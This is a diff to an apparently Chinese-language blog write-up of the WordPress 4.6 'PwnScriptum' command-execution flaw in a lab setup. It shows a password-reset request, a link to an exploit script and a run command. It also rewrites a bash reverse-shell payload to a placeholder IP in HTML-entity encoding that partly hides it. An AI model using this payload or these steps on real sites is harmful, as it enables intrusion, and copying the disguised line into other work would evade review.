@@ -1,4 +1,5 @@
 ---
+disableNunjucks: true
 title: "Wordpress 4.6 任意命令执行漏洞 PwnScriptum"
 date: 2026-10-12 09:01:16
 categories:
@@ -42,8 +43,10 @@ Content-Length: 56
 Content-Type: application/x-www-form-urlencoded
 
 wp-submit=Get+New+Password&redirect_to=&user_login=admin
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
+<pre><code class="language-text">
 ![image-20220302225431160](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202203022254237.png)
 
 ![image-20220302225419095](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202203022254142.png)
@@ -71,15 +74,16 @@ wp-submit=Get+New+Password&redirect_to=&user_login=admin
 
 将上述过程写成[exp脚本](https://github.com/vulhub/vulhub/blob/master/wordpress/pwnscriptum/exploit.py)，将脚本中target修改成你的目标，user修改成一个已经存在的用户，`shell_url`修改成你放置payload的网址。（或直接将target作为第一个参数、`shell_url`作为第二个参数）
 
-> example.com/shell.sh的内容为：
->
-> ```
-> bash -i >& /dev/tcp/your-reverse—shell-ip/9999 0>&1
-> ```
+&gt; example.com/shell.sh的内容为：
+&gt;
+&gt; ```
+&gt; &#98;ash -i &gt;&amp; &#47;dev/tcp/your-reverse—shell-ip/9999 0&gt;&amp;1
+&gt; ```
 
 执行即可获得shell：
+</code></pre>
 
-```
+</details>
 python wordpress.py http://192.168.174.128:8080 example.com/shell.sh
 ```
 
